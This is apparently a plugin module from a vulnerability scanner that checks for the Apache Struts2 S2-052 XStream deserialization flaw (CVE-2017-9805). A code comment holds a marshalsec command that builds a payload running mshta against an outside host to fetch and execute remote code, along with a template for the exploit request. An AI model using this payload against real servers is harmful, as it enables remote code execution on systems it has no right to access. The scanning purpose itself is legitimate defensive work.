
module.exports={
	tags:"struts2,052",
	des:"struts2 052Vulnerability detection,CVE-2017-9805",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052",
		""],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-052"],
	/*
java -cp jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream  ImageIO 'mshta http://33.33.'
POST /orders/3 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Content-Type: application/xml
Content-Length: 1659
Referer: http://127.0.0.1:8080/orders/3/edit

{pay}
	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self,hst = _s.parseUrl(url), szData = '';
		var szOldUrl = url,fnTT = function(x1)
		{
			return _s.fnUrlEncode(x1,'#:@=.[]?( )');
		};
		_s.request(_s.fnOptHeader({method: 'POST',uri: url,
			data:szData,
			headers:{
				"content-type": "application/xml",
				"user-agent": _s.g_szUa,
				"upgrade-insecure-requests": 1
			}
		}),
	    	function(e,r,b)
	    {
        _s.error(e);
        _s.fnShowBody(b);
	    	// console.log(b);
	    	_s.fnDoBody(b,"s2-052",szOldUrl,null,function(o)
	    	{
	    		var r = {"url":szOldUrl,"send":url};
  				fnCbk(_s.copyO2O(r,o),_t);
	    	});
	    });
	}
};